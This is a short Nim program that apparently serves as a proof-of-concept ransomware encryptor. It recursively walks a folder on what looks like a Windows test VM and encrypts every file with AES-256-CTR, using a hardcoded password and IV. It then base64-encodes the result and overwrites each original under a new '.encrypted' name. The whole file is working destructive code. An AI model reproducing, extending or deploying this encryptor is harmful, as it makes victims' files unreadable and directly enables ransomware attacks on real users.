import os
import strformat
import base64
import nimcrypto

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

let
    password: string = "myKey" # Our secret key
    path: string = "C:/Users/IEUser/Desktop/test-files"

for file in walkDirRec path:
   let fileSplit = splitFile(file)
   if fileSplit.ext != ".encrypted":
    echo fmt"[*] Encrypting: {file}"
    var
        inFileContents: string = readFile(file)
        plaintext: seq[byte] = toByteSeq(inFileContents) 
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        encrypted: seq[byte] = newSeq[byte](len(plaintext))
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
        
    
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encrypted)
    ectx.clear()

    let encodedCrypted = encode(encrypted)
    let finalFile = file & ".encrypted" 
    moveFile(file, finalFile)
    writeFile(finalFile, encodedCrypted)

